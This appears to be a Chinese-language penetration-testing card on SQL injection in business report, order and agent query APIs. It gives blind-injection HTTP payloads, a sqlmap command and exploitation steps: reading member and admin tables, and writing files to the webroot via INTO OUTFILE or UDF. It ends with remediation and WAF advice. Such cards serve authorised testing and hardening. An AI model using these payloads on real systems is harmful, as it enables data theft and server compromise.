---
title: 业务接口 SQL 注入（报表 / 订单 / 代理查询）
cve: 无（实现缺陷）
severity: critical
cvss: 9.8
product: 自研报表与查询接口
versions: 任意
ports: 80, 443
keywords: sqli, 注入, orderNo, agentId, 报表, 盲注, union
entry: orderNo=1' AND SLEEP(5)--
verified: false
sources: 公开资料整理（实现缺陷类，无 CVE）
---

## 指纹

- 报表/导出/列表类接口参数直接拼 SQL：`orderNo`、`agentId`、`date`、`sort`、`order`。
- 报错页含 `SQL syntax`、`MySQL`、`ORA-`、`ODBC`。

## 前置条件

- 有账号（部分报表要代理或后台权限，很多站前台订单查询也拼接）。
- 授权测试，避免 `SLEEP` 把生产打满。

## PoC

```http
### 时间盲注
GET /api/order/query?orderNo=20241105001'%20AND%20SLEEP(5)--%20- HTTP/1.1
Authorization: Bearer <token>

### 布尔盲注
GET /api/report/bet?agentId=1'%20AND%201=1--%20- HTTP/1.1
GET /api/report/bet?agentId=1'%20AND%201=2--%20- HTTP/1.1
```

```bash
# sqlmap 指定目标参数（低并发，避免触发风控）
sqlmap -r req.txt -p orderNo --batch --level 2 --risk 2 --threads 2 --dbms mysql
```

## 利用步骤

1. 先做单引号探测（报错/500/延迟差异），确认注入点。
2. 用时间盲注确认（`SLEEP(3)` 对比），再 `UNION SELECT version(),database()`。
3. 读关键表：`member`（手机号/密码哈希）、`order`、`withdraw`、`admin_user`。
4. 有 `FILE` 权限时 `INTO OUTFILE` 写 webroot；无则走 UDF 或仅数据读取。
5. 证据：延迟对比两条 + `version()` 回显；报告只列表名与字段，别导数据。

## 修复与缓解（加固）

- 全量参数化查询（预编译）；禁止字符串拼 SQL。
- DB 账号最小权限（禁 `FILE`、禁跨库）；错误页统一（不回显 SQL）。
- WAF 拦 `SLEEP(`、`UNION SELECT`、`--` 组合；查询接口加限速。

## 参考

- OWASP WSTG-INPV-05；sqlmap 文档。
